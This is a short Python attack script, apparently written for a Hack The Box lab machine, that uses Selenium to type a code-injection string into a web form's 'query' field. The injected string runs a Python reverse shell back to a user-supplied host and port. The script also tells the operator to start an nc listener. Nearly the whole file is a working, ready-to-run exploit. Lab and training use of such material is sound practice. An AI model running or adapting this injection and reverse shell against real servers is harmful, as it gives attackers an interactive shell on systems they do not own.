#!/usr/bin/env python3

import sys
import subprocess
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import importlib.util

#install libaries if not installed
package_name = 'colorama'
spec = importlib.util.find_spec(package_name)
if spec is None:
	print(package_name +" is not installed, installing now")
	subprocess.check_call([sys.executable, '-m', 'pip3', 'install', package_name])
else:
	print("Colorama installed, not installing")
package_name = 'selenium'
spec = importlib.util.find_spec(package_name)
if spec is None:
	print(package_name +" is not installed, installing now")
	subprocess.check_call([sys.executable, '-m', 'pip3', 'install', package_name])
else:
	print("Selenium installed, not installing")

#############################################################################################################################################

LHOST = input(Fore.RED + "LHOST? \n"+Fore.RESET)
LPORT = input(Fore.RED + "LPORT? \n"+Fore.RESET)
URL = input(Fore.RED + "URL? \n"+Fore.RESET)
Press_Enter = input(Fore.GREEN + "Sending Exploit, start NC listener with nc -lvnp "+LPORT+" please press enter to continue"+Fore.RESET)
# create webdriver object
driver = webdriver.Firefox()
  
# get geeksforgeeks.org
driver.get(URL)
  
# get element (may need to change if not going against HTB Machine)
element = driver.find_element(By.NAME, 'query')

# send keys 
element.send_keys("', exec(\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('"+LHOST+"',"+LPORT+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"))#")
element.submit()
